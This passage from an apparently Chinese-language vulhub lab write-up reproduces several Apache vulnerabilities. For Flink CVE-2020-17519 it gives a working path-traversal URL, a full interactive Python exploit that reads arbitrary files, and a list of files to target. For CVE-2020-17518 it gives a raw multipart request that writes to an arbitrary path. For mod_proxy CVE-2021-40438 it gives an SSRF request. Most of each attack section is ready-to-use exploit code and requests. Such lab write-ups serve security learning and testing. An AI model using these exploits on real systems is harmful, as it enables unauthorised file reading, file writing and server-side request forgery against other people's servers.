Flink版本为1.11.0或者1.11.1或者1.11.2</span><br></pre></td></tr></table></figure>

<p>访问8081端口，看到如下面板，可以看到版本为1.11.2，是符合漏洞利用条件的</p>
<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17519%E7%A0%B4%E8%A7%A3.png" class>

<p>Apache Flink 的 6123 端口用于 Flink 的远程通信和管理，主要用于与 Flink 集群中的 JobManager 通信。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JobManager 是 Flink 集群的主要协调节点，负责接收和调度提交的作业（jobs），管理任务的调度和执行，并提供了 REST 接口供用户和外部系统与 Flink 集群进行交互。  通过 6123 端口，您可以使用 Flink 的 REST API 与 Flink 集群进行交互，例如提交作业、查询作业状态、获取作业详情 等操作。这是与 Flink 集群进行远程管理和监控的入口之一。</span><br></pre></td></tr></table></figure>

<p>关于8081端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8081 端口用于 Flink 的 Web UI 界面和 REST 接口。Flink 的 Web UI 提供了一个用户界面，允许您监控和管理正在执行 的作业、任务、JobManager 和 TaskManager 的状态等。此外，8081 端口还提供了 Flink 的 REST API，允许您通过  HTTP 请求与 Flink 集群进行交互，例如提交作业、查询作业状态、获取作业计数等。</span><br></pre></td></tr></table></figure>

<p>6123 端口用于 Flink 内部组件之间的通信，而 8081 端口用于提供用户界面和与 Flink 集群进行交互的 REST 接 口。所以我们打的是8081端口(也可能被改成其他的了,反正是提供ui的那个端口)</p>
<p>直接使用poc的生成进行目录穿越</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.129:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17519%E7%A0%B4%E8%A7%A32.png" class>

<p>可以看到读取成功，复现完成</p>
<p>这里附上相关脚本，因为实战不一定需要穿越这么多层目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: Apache Flink   1.11.0-1.11.2                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式: python3 CVE-2020-17519.py                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mFile        &gt;&gt;&gt; /etc/passwd                                        \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url, file_name):</span><br><span class="line">    file_name = file_name.replace(&quot;/&quot;, &quot;%252f&quot;)</span><br><span class="line">    vuln_url = target_url + &quot;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..&#123;&#125;&quot;.format(file_name)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers)</span><br><span class="line">        print(&quot;\033[32m[o] 请求URL ： &#123;&#125;\033[0m&quot;.format(vuln_url))</span><br><span class="line">        if &quot;root&quot; in response.text:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 存在漏洞,成功读取 /etc/passwd ，响应为:\n&#123;&#125;\033[0m&quot;.format(target_url, response.text))</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">def POC_2(target_url, file_name):</span><br><span class="line">    file_name_re = file_name.replace(&quot;/&quot;, &quot;%252f&quot;)</span><br><span class="line">    vuln_url = target_url + &quot;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..&#123;&#125;&quot;.format(file_name_re)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers)</span><br><span class="line">        print(&quot;\033[32m[o] 请求URL ： &#123;&#125;\033[0m&quot;.format(vuln_url))</span><br><span class="line">        if &quot;error&quot; not in response.text:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 存在漏洞,成功读取 &#123;&#125; ，响应为:\n&#123;&#125;\033[0m&quot;.format(target_url, file_name, response.text))</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;\033[31m[x] 目标文件&#123;&#125;读取失败\033[0m&quot;.format(file_name))</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl   &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    file_name = &quot;/etc/passwd&quot;</span><br><span class="line">    POC_1(target_url, file_name)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        file_name = input(&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;)</span><br><span class="line">        if file_name == &quot;exit&quot;:</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        else:</span><br><span class="line">            POC_2(target_url, file_name)</span><br></pre></td></tr></table></figure>

<p>这个脚本会先拿&#x2F;etc&#x2F;passwd测试是否读取成功来判断是否存在漏洞,如果存在就可以直接读取了,这里贴一份linux都有的文件,并且不需要root直接就能读的,因为这个漏洞读文件是没有root的,感觉比较鸡肋,得配合别的漏洞才能打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd: 包含有关系统用户的信息。</span><br><span class="line">/etc/group: 包含有关用户组的信息。</span><br><span class="line">/etc/hostname: 包含主机名信息。</span><br><span class="line">/etc/issue: 包含系统登录提示信息。</span><br><span class="line">/etc/motd: 包含登录后的消息（Message of the Day）。</span><br><span class="line">/etc/resolv.conf: 包含 DNS 解析配置信息。</span><br><span class="line">/etc/fstab: 包含文件系统挂载信息。</span><br><span class="line">/etc/hosts: 包含主机名与 IP 地址的映射。</span><br><span class="line">/etc/issue.net: 包含在网络上显示的信息。</span><br><span class="line">/etc/localtime: 包含系统的时区信息。</span><br><span class="line">/usr/share/zoneinfo: 包含各个时区的文件。</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2020-17518（Apache-flink远程代码执行漏洞）"><a href="#CVE-2020-17518（Apache-flink远程代码执行漏洞）" class="headerlink" title="CVE-2020-17518（Apache flink远程代码执行漏洞）"></a>CVE-2020-17518（Apache flink远程代码执行漏洞）</h2><p>由于CVE-2020-17519也是关于介绍Apache flink的，所以就不再进行叙述了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flink在1.5.1版本中引入了一个REST handler，这允许攻击者将已上传的文件写入到本地任意文件中，并且可通过一个恶意修改的HTTP头将这些文件写入到Flink 1.5.1可以访问的任何位置</span><br><span class="line"></span><br><span class="line">在1.5.1版本中引入的REST handler是用于通过REST API执行特定的操作，通过REST handler，可以使用HTTP请求来与Flink集群进行交互没执行各种操作，例如提交作业等等。</span><br></pre></td></tr></table></figure>

<p>如果要使用REST handler，需要执行以下步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Flink 配置文件中，您需要启用REST接口，找到以下配置项并设置为true:</span><br><span class="line">rest.port:8081</span><br><span class="line">rest.bind-address:localhost</span><br><span class="line"></span><br><span class="line">这将启用Flink的REST接口，并将其绑定到本地主机的8081端口</span><br></pre></td></tr></table></figure>

<p>一旦启用了REST接口，可以使用任何HTTP请求的工具（例如curl、Postman、浏览器等），来与Flink集群进行交互，例如，要提交一个作业，可以使用POST请求来提交作业的JAR文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Expect:&quot; -F &quot;jarfile=@/path/to/your/job.jar&quot; http://localhost:8081/jars/upload</span><br></pre></td></tr></table></figure>

<p>要查询作业，可以使用get请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8081/jobs</span><br></pre></td></tr></table></figure>

<p>在 Apache Flink 中，一个”作业”（Job）是指一个由一个或多个数据流转换操作组成的数据处理流程。这个流程通常是用户编写的代码，用于在分布式环境中执行数据处理任务。作业描述了数据的输入、转换操作以及输出。它包含了以下部分 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据源（Source）：作业通常从一个或多个数据源获取输入数据。数据源可以是文件、消息队列、套接字等。 </span><br><span class="line"></span><br><span class="line">转换操作（Transformation）：这些操作对输入数据进行处理，可以是诸如映射、过滤、分组、聚合等操作。  </span><br><span class="line"></span><br><span class="line">数据汇（Sink）：作业将处理后的数据发送到一个或多个数据汇，数据汇可以是文件、数据库、消息队列等。  </span><br><span class="line"></span><br><span class="line">并行度（Parallelism）：作业可以在集群的多个计算节点上并行执行，通过指定并行度，您可以控制作业的分布式执行方式。  </span><br><span class="line"></span><br><span class="line">检查点（Checkpointing）：Flink 支持状态检查点，以便在发生故障时恢复作业状态。</span><br></pre></td></tr></table></figure>

<p>漏洞利用条件</p>
<p>1.5.1&lt;&#x3D;Apache Flink&lt;&#x3D;1.11.2</p>
<h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17518%E7%A0%B4%E8%A7%A3.png" class>

<p>访问目标机的8081端口，从面板可以看到Apache flink版本为1.11.2，符合漏洞要求</p>
<p>利用方法就是发送一个post的包，模板如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: 靶机ip:端口</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;写入文件的绝对路径&quot;</span><br><span class="line"></span><br><span class="line">你想写入的内容</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /jars/upload HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../tmp/liberator&quot;</span><br><span class="line"></span><br><span class="line">liberator</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17518%E7%A0%B4%E8%A7%A32.png" class>

<p>可以看到写入成功，老样子，我们还是连接镜像内部的shell，来检验文件是否写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -i e1ceeb97b6f9 /bin/bash</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17518%E7%A0%B4%E8%A7%A33.png" class>

<p>可以看到文件写入成功</p>
<h2 id="CVE-2021-40438（Apache-server-mod-proxy的SSRF漏洞）"><a href="#CVE-2021-40438（Apache-server-mod-proxy的SSRF漏洞）" class="headerlink" title="CVE-2021-40438（Apache server mod_proxy的SSRF漏洞）"></a>CVE-2021-40438（Apache server mod_proxy的SSRF漏洞）</h2><p>apache的服务就不说了,天天用.其中mod_proxy模块是用于反向代理的模块，它允许将客户端请求代理到另一个服务器上。反向代理的概念是客户端将请求发送给一个服务器，但实际上请求会被代理服务器转发到另一个目标服务器上，然后将目标服务器的响应返回给客户端。 使用mod_proxy模块时，需要在Apache的配置文件中进行相应的配置。以下是一个简单的示例配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apacheCopy codeLoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_http_module modules/mod_proxy_http.so</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName example.com</span><br><span class="line"></span><br><span class="line">    ProxyPass / http://backend-server/</span><br><span class="line">    ProxyPassReverse / http://backend-server/</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<p>上述配置中，ProxyPass将所有对example.com的请求代理到backend-server上，并且ProxyPassReverse用于修改响应中的Location头，确保响应正确返回给客户端。 mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。 </p>
<p>漏洞利用条件为apache v2.4.48 及以下版本 漏洞复现</p>
<h3 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h3><p>先访问一下服务,docker ps可以看到服务开在了8080端口.这里访问可以看到一个Apache Tomcat的示例页面，此时Apache HTTP Server是以中间反代服务器的身份，运行在客户端（用户）和后端服务器（Tomcat）之间，Apache和Tomcat通过AJP协议进行通信。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AJP（Apache JServ Protocol）协议是一种用于连接Web服务器（如Apache HTTP Server）与Java应用服务器（如</span><br><span class="line">Tomcat）之间的协议。它被设计用于在Web服务器和应用服务器之间进行高效的通信，以便将HTTP请求从Web服务器传递到应用</span><br><span class="line">服务器，并将应用服务器生成的响应传递回Web服务器，最终返回给客户端。</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/40438%E7%A0%B4%E8%A7%A3.png" class>

<p>使用发包就可以达到目的，发包示例如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://www.baidu.com/ HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/40438%E7%A0%B4%E8%A7%A32.png" class>

<p>可以看到成功出现302跳转</p>
<h2 id="CVE-2021-41773（Apache-HTTP-Server路径穿越漏洞）"><a href="#CVE-2021-41773（Apache-HTTP-Server路径穿越漏洞）" class="headerlink" title="CVE-2021-41773（Apache HTTP Server路径穿越漏洞）"></a>CVE-2021-41773（Apache HTTP Server路径穿越漏洞）</h2><p>在其2.4.49版本中，引入了一个路径穿越漏洞,这个漏洞有两种利用方式,在严格情况下可以实现任意文件读取(一般web服务器也不是拿root运行的,就只能读非root文件了),如果开启了cgi或cgid,可以实现rce </p>
<p>在 Apache HTTP Server 中，CGI（Common Gateway Interface）和 CGID（CGI Daemon）是用于处理动态内容的机制。它们允许 Web 服务器与外部程序（通常是脚本或可执行文件）进行交互，生成动态的 Web 页面内容。CGI 机制允许将用户的请求传递给一个外部脚本或程序，然后将该程序的输出作为响应返回给客户端。 </p>
<p>要使用 CGI 或 CGID，你需要编写一个符合 CGI 协议的程序或脚本，该程序会接收请求参数，处理请求并生成响应。然后，你需要在 Apache HTTP Server 的配置中启用 CGI 或 CGID 模块，并将请求映射到你编写的 CGI 程序或脚本。 在 Apache 的配置文件中，使用类似以下的配置来启用 CGI 模块并将请求映射到某个目录下的 CGI 脚本：</p>
